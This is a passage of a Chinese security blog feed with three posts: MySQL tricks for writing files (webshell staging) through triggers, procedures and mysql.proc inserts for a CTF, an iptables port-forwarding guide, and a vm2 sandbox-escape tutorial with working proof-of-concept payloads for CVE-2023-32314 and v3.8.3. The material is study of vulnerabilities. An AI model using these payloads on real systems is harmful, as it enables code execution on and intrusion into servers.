class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 使用<span class="keyword">trigger</span></span><br><span class="line"><span class="keyword">create</span> database a;</span><br><span class="line">use a;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a(id <span class="type">int</span>) engine<span class="operator">=</span><span class="string">&#x27;memory&#x27;</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> t before <span class="keyword">insert</span> <span class="keyword">on</span> a.a <span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/trigger&#x27;</span>;</span><br><span class="line"># <span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span>(exp)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span>(<span class="number">114</span>);</span><br><span class="line"></span><br><span class="line"># 使用<span class="keyword">procedure</span></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> <span class="built_in">exp</span>()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/procedure&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">exp</span>();</span><br><span class="line"></span><br><span class="line"># 使用<span class="keyword">function</span></span><br><span class="line">DELIMITER <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">function</span> <span class="built_in">exp</span>()</span><br><span class="line"><span class="keyword">RETURNS</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="keyword">DETERMINISTIC</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/function&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">END</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>();</span><br></pre></td></tr></table></figure><p>上面的命令任选一种方式执行完后（这里我使用的是第一种），我们会发现攻击机和靶机的 <code>/tmp</code> 命令下都成功写入了 <code>exp</code> 。</p><p><img src="/imgs/1693371005579.png"></p><h1 id="方式三：仅用insert语句写入webshell"><a href="#方式三：仅用insert语句写入webshell" class="headerlink" title="方式三：仅用insert语句写入webshell"></a>方式三：仅用insert语句写入webshell</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>方式三和方式二的思路一样，也是创建 <code>trigger/procedure/function</code> ，但是不是通过常规的命令创建。而是通过写入 <code>trigger/procedure/function</code> 所存放在的表来创建他们。</p><p>需要注意的是，<code>MySQL 8.0</code> 之前的版本，存储过程是存放在 <code>mysql.proc</code> 表中的，并且这个表可以直接被修改，因此我们可以直接用 <code>insert</code> 写入存储过程。但是在 <code>MySQL 8.0</code> 之后，没有了 <code>mysql.proc</code> 表，<code>trigger/procedure/function</code> 都存放在 <code>information_schema</code> 数据库中，而 <code>information_schema</code> 数据库只能读取，不能修改，因此方式三就没办法用了。</p><blockquote><p>补充：<br><code>MySQL-8.0</code> 之前，<code>trigger</code> 存放在 <code>information_schema.TRIGGERS</code> 中，<code>procedure</code> 和 <code>function</code> 不仅都存放在 <code>information_schema.ROUTINES</code> 中还存放在 <code>mysql.proc</code> 中，虽然 <code>information_schema</code> 数据库不能被修改，但是 <code>mysql.proc</code> 是用户可以修改的。而且 <code>mysql.proc</code> 数据库修改后 <code>information_schema</code> 数据库也会同步修改，因此我们就可以通过 <code>mysql.proc</code> 表来添加 <code>procedure/function</code> 。</p><p><code>MySQL-8.0</code> 之后，取消了 <code>mysql.proc</code> 表，上面 <code>information_schema</code> 库中的表没变。</p></blockquote><p><img src="/imgs/1693377411056.png"></p><h2 id="利用实验-2"><a href="#利用实验-2" class="headerlink" title="利用实验"></a>利用实验</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql.proc <span class="keyword">values</span> (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;PROCEDURE&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;SQL&#x27;</span>, <span class="string">&#x27;CONTAINS_SQL&#x27;</span>, <span class="string">&#x27;NO&#x27;</span>, <span class="string">&#x27;DEFINER&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;BEGIN  </span></span><br><span class="line"><span class="string">SELECT \&#x27;</span>exp...\<span class="string">&#x27; into outfile \&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="keyword">procedure</span>\<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">END&#x27;</span>, <span class="string">&#x27;root@localhost&#x27;</span>, <span class="string">&#x27;2023-08-30 14:36:29&#x27;</span>, <span class="string">&#x27;2023-08-30 14:36:29&#x27;</span>, <span class="string">&#x27;STRICT_TRANS_TABLES&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span>, <span class="string">&#x27;utf8mb4_general_ci&#x27;</span>, <span class="string">&#x27;utf8_unicode_ci&#x27;</span>, <span class="string">&#x27;BEGIN  </span></span><br><span class="line"><span class="string">SELECT \&#x27;</span>exp...\<span class="string">&#x27; into outfile \&#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span><span class="keyword">procedure</span>\<span class="string">&#x27;;  </span></span><br><span class="line"><span class="string">END&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="/imgs/1693378771183.png"></p><p>发现确实成功写入了 <code>procedure</code> 。</p><p><img src="/imgs/1693378817037.png"></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过前两种方式实验的对比（第三种方式归为第二种），发现其实第二种方式简单很多，其实第一种方式没什么实战意义，一般只会禁用 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> ，这时直接用第二种方式就可以了。第一种只是用于多学会一种姿势技巧。如果在禁用了 <code>into</code> ，<code>outfile</code> ，<code>dumpfile</code> 关键字的基础上还禁用了 <code>trigger</code> ，<code>function</code> ，<code>procedure</code> ，<code>call</code> 关键字，就可以考虑使用第一种方式。</p><h1 id="灵感来源题目"><a href="#灵感来源题目" class="headerlink" title="灵感来源题目"></a>灵感来源题目</h1><p><a href="https://github.com/wm-team/WMCTF-2023">WMCTF 2023 WEB-ezblog</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wawa8899/article/details/86689618</span><br><span class="line">https://www.modb.pro/db/29919</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 提权 </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables实现流量转发</title>
      <link href="/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/"/>
      <url>/2023/08/25/iptables%E5%AE%9E%E7%8E%B0%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/uiop_uiop_uiop/article/details/128095847</span><br></pre></td></tr></table></figure><h1 id="内网流量转发"><a href="#内网流量转发" class="headerlink" title="内网流量转发"></a>内网流量转发</h1><h2 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h2><p>将本地访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><p>然后自己 <code>curl</code> 自己的 10001 端口，发现 10002 端口收到了流量。</p><h2 id="外网端口转发"><a href="#外网端口转发" class="headerlink" title="外网端口转发"></a>外网端口转发</h2><p>将外网访问本机 10001 端口的流量转发到本机 10002 端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 10001 -j REDIRECT --to-ports 10002</span><br></pre></td></tr></table></figure><h1 id="通过跳板机流量转发"><a href="#通过跳板机流量转发" class="headerlink" title="通过跳板机流量转发"></a>通过跳板机流量转发</h1><p>假设转发服务器的地址 <code>192.168.188.130</code> 。目的服务器的地址是 <code>114.132.243.19</code> 。在转发服务器上把 <code>8080</code> 端口转发到 <code>114.132.243.19</code> 的 <code>80</code> 端口。</p><ol><li><p>打开 <code>ipv4</code> 的转发功能。<br>[[arp攻击#arp实验]]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></li><li><p>在 <code>PREROUTING</code> 上修改目的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 114.132.243.19:80</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932408931.png"></p><p>这里的报错应该是复制粘贴的问题，好像复制的空格被看作了 <code>&amp;nbsp;</code> ，不是代码的问题，导致没有把 <code>8080</code> 和 <code>j</code> 识别分开。</p><p><img src="/imgs/1677931663908.png"></p><p><img src="/imgs/1677932796726.png"></p><ol start="3"><li>在 <code>POSTROUTING</code> 上修改源地址<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.198 -p tcp --dport 80 -j SNAT --to 192.168.188.130</span><br></pre></td></tr></table></figure>或者用伪装的方式<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 114.132.243.19 -p tcp --dport 80 -j MASQUERADE</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677932607172.png"></p><ol start="4"><li>为了防止在 <code>FORWARD</code> 上面被丢弃，添加规则允许通过。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  </span><br><span class="line">iptables -I FORWARD -d 114.132.243.19 -p tcp --dport 80 -j ACCEPT</span><br><span class="line">2.</span><br><span class="line">iptables -I FORWARD -s 114.132.243.19 -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure></li></ol><p><img src="/imgs/1677931921783.png"></p><p>注意 <code>iptables</code> 的增加和删除有一定的延迟，测试的时候要注意。</p><p>现在就可以在客户端上测试一下访问 <code>192.168.188.130:8080</code> 就会访问到 <code>114.132.243.19:80</code> 。</p><p><img src="/imgs/1677930811243.png"></p><h1 id="IP重定向"><a href="#IP重定向" class="headerlink" title="IP重定向"></a>IP重定向</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>有时我们想让一个域名指向另一个 <code>IP</code> 时，我们会直接修改 <code>/etc/hosts</code>，来实现我们的目地。那如果是访问一个 <code>IP</code>，需要这个 <code>IP</code> 指向另一个 <code>IP</code> 呢？是的，<code>iptables</code>  可以实现这层转发。</p><ul><li><p>场景一 : 家中有一台服务器内网 IP <code>192.168.0.111</code>, 公网 IP <code>123.123.123.123</code>，你可以通过 IP <code>123.123.123.123</code>在任何地方你都可以访问到你的服务器，在家的时候你可以通过内网来访问你的服务器，当然如果你在你家的电脑把 <code>123.123.123.123</code> 指向 <code>192.168.0.111</code> 那么你依然可以用外网来访问，但是其实走的是内网流量，速度会快很多。</p></li><li><p>场景二 : 此场景源于最近装的 <code>k8s</code> 集群，由于 3 台机子不在一个内网中，所以需要用外网来建立集群。其中有参数可以配置用公网来启动集群，但是无论是阿里还是腾讯，都没有把公网绑在机子的网卡上，所以我一直启动失败。当绑定在内网上却可以启动成功，那我只能想到这个折中的方法了，因为他们内网是不通的，所以通过内网 IP 是不能访问的，可是用内网启动一定要用内网连接，那我把内网 IP 重定向到外网 IP 上不就可以了？事实证明真的成功组成了集群。当然如果有更好的解决方案也欢迎告知我。</p></li><li><p>更多使用场景请自行发掘</p></li></ul><h2 id="把外网ip映射到内网ip"><a href="#把外网ip映射到内网ip" class="headerlink" title="把外网ip映射到内网ip"></a>把外网ip映射到内网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 123.123.123.123 -j DNAT --to-destination 192.168.0.111</span><br></pre></td></tr></table></figure><h2 id="把内网ip映射到外网ip"><a href="#把内网ip映射到外网ip" class="headerlink" title="把内网ip映射到外网ip"></a>把内网ip映射到外网ip</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -d 192.168.0.111 -j DNAT --to-destination 123.123.123.123</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> iptables </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VM2沙箱逃逸</title>
      <link href="/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/25/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li><code>JavaScript</code> 和 <code>Nodejs</code> 之间有什么区别：<code>JavaScript</code> 用在浏览器前端，后来将 <code>Chrome</code> 中的 <code>v8</code> 引擎单独拿出来为 <code>JavaScript</code> 单独开发了一个运行环境，因此 <code>JavaScript</code> 也可以作为一门后端语言，写在后端（服务端）的 <code>JavaScript</code> 就叫叫做 <code>Nodejs</code> 。</li><li>什么是沙箱（ <code>sandbox</code> ）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li><li>沙箱（ <code>sandbox</code> ）和 虚拟机（ <code>VM</code> ）和 容器（ <code>Docker</code> ）之间的区别：<code>sandbox</code> 和 <code>VM</code> 使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。<code>Docker</code> 属于 <code>sandbox</code> 的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用 <code>Docker</code> 和<code>sandbox</code> 嵌套的方式更多一点，安全性也更高。</li><li>在 <code>Nodejs</code> 中，我们可以通过引入 <code>vm</code> 模块来创建一个“沙箱”，但其实这个 <code>vm</code> 模块的隔离功能并不完善，还有很多缺陷，因此 <code>Node</code> 后续升级了 <code>vm</code> ，也就是现在的 <code>vm2</code> 沙箱，<code>vm2</code> 引用了 <code>vm</code> 模块的功能，并在其基础上做了一些优化。</li></ul><h1 id="VM介绍"><a href="#VM介绍" class="headerlink" title="VM介绍"></a>VM介绍</h1><h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p>在 <code>Node.js</code> 中，<code>VM(Virtual Machine)</code> 是一个用于解释和执行 <code>JavaScript</code> 代码的引擎。<code>VM</code> 是一个沙箱 ( <code>sandbox</code> ),它允许 <code>Node.js</code> 在执行脚本时限制其访问系统资源的权限，以防止脚本执行恶意代码或访问不必要的系统资源。</p><h2 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h2><p>由于 <code>vm</code> 不安全，能轻易地获取到了主程序的全局对象 <code>process</code> ，造成沙箱逃逸，所以有了 <code>vm2</code> 。<code>vm2</code> 基于<code>vm</code> ，使用官方的 <code>vm</code> 库构建沙箱环境。然后使用 <code>JavaScript</code> 的 <code>Proxy</code> 技术来防止沙箱脚本逃逸。</p><h1 id="VM的使用"><a href="#VM的使用" class="headerlink" title="VM的使用"></a>VM的使用</h1><p>我们首先要引入 <code>Nodejs</code> 内置的 <code>vm</code> 模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="在创建的虚拟机中执行代码"><a href="#在创建的虚拟机中执行代码" class="headerlink" title="在创建的虚拟机中执行代码"></a>在创建的虚拟机中执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">console</span>: <span class="variable language_">console</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>这里会发现终端上会打印 <code>2</code> 这个结果。如果我们在 <code>context</code> 中没有设置 <code>console: console</code> ，那就不会在终端上打印 <code>2</code> 。这里我的理解是，由于这里执行的代码中一个新的虚拟机，那么这个虚拟机中的环境和当前的环境是不一致的，也就是虚拟机中执行的命令不会回显到当前环境中，也就不会打印在终端上。但是背地还是执行了的。</p><h2 id="在当前上下文执行代码"><a href="#在当前上下文执行代码" class="headerlink" title="在当前上下文执行代码"></a>在当前上下文执行代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);  </span><br><span class="line"><span class="variable language_">global</span>.<span class="property">x</span> = <span class="number">1</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`console.log(x);`</span>;  </span><br><span class="line">  </span><br><span class="line">vm.<span class="title function_">runInThisContext</span>(code);</span><br></pre></td></tr></table></figure><h1 id="示例说明VM模块的作用"><a href="#示例说明VM模块的作用" class="headerlink" title="示例说明VM模块的作用"></a>示例说明VM模块的作用</h1><h2 id="使用VM模块来实现一个简单的沙盒"><a href="#使用VM模块来实现一个简单的沙盒" class="headerlink" title="使用VM模块来实现一个简单的沙盒"></a>使用VM模块来实现一个简单的沙盒</h2><p>假设我们需要运行来自用户的 <code>JavaScript</code> 代码，但又不想让这些代码对我们的系统造成损害。这时，我们可以使用 <code>VM</code> 模块来实现一个简单的沙盒。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">    function add(a, b) &#123;</span></span><br><span class="line"><span class="string">        return a + b;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    console.log(add(2, 3));</span></span><br><span class="line"><span class="string">    console.log(process.argv);</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> context = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">    <span class="attr">process</span>: &#123;</span><br><span class="line">        <span class="attr">argv</span>: [<span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;index.js&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(context);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context);</span><br></pre></td></tr></table></figure><p>上面的代码创建了一个虚拟机上下文，并在其中执行了 <code>JavaScript</code> 代码。在上下文中，我们定义了一个 <code>console</code> 对象和一个 <code>process</code> 对象，并向 <code>process</code> 对象中添加了一个 <code>argv</code> 属性。然后，我们执行了一个包含了一个 <code>add</code> 函数和一些输出语句的 <code>JavaScript</code> 代码。这个 <code>JavaScript</code> 代码会输出 <code>5</code> 和 <code>process.argv</code> 数组。</p><p>这样，我们就成功地把用户的代码隔离在一个虚拟机中，避免了它对我们的系统造成损害。</p><h1 id="VM2沙箱逃逸-v3-9-17，CVE-2023-32314"><a href="#VM2沙箱逃逸-v3-9-17，CVE-2023-32314" class="headerlink" title="VM2沙箱逃逸( v3.9.17，CVE-2023-32314)"></a>VM2沙箱逃逸( v3.9.17，CVE-2023-32314)</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><code>3.9.17</code> 及以下版本的 <code>vm2</code> 中存在沙盒逃逸漏洞。它滥用基于代理规范的宿主对象的意外创建，并允许<code>Function</code> 在宿主上下文中通过导致 <code>RCE</code> 。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p><code>Vm2 &lt;= 3.9.17</code> </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="/imgs/1690893929063.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.9.17</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">  const err = new Error();</span></span><br><span class="line"><span class="string">  err.name = &#123;</span></span><br><span class="line"><span class="string">    toString: new Proxy(() =&gt; &quot;&quot;, &#123;</span></span><br><span class="line"><span class="string">      apply(target, thiz, args) &#123;</span></span><br><span class="line"><span class="string">        const process = args.constructor.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">        throw process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span></span><br><span class="line"><span class="string">      &#125;,</span></span><br><span class="line"><span class="string">    &#125;),</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  try &#123;</span></span><br><span class="line"><span class="string">    err.stack;</span></span><br><span class="line"><span class="string">  &#125; catch (stdout) &#123;</span></span><br><span class="line"><span class="string">    stdout;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(vm.<span class="title function_">run</span>(code));</span><br></pre></td></tr></table></figure><p><img src="/imgs/1690893824209.png"></p><h1 id="VM2沙箱逃逸（v3-8-3）"><a href="#VM2沙箱逃逸（v3-8-3）" class="headerlink" title="VM2沙箱逃逸（v3.8.3）"></a>VM2沙箱逃逸（v3.8.3）</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vm2@3.8.3</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">TypeError</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get_process</span> = <span class="function"><span class="params">f</span>=&gt;</span>f.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return process&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">preventExtensions</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&quot;&quot;</span>)).<span class="property">a</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">get_process</span>(<span class="function">()=&gt;</span>&#123;&#125;).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload</code> 来自 <code>https://github.com/patriksimek/vm2/issues/225</code> 。</p><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>现在 <code>VM2</code> 这个项目作者已经不再维护了，并且作者建议我们不要在生产环境用这个项目了。因为 <code>Node</code> 日益复杂，防止 <code>Node</code> 沙箱逃逸是一件日益复杂的事情。而且主要是因为这个项目使用的防止逃逸的策略被证实是不当的，最新版本的 <code>VM2</code> 项目也存在沙箱逃逸，并且作者发现如果进一步防止沙箱逃逸需要更改整个项目的代码架构策略，因此作者选择了放弃。作者建议我们选择 <code>isolated-vm</code> 这个项目。这个项目选择了不同的思路但是一样有效的方式来防止沙箱逃逸。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight plaintext"><table><tr><td 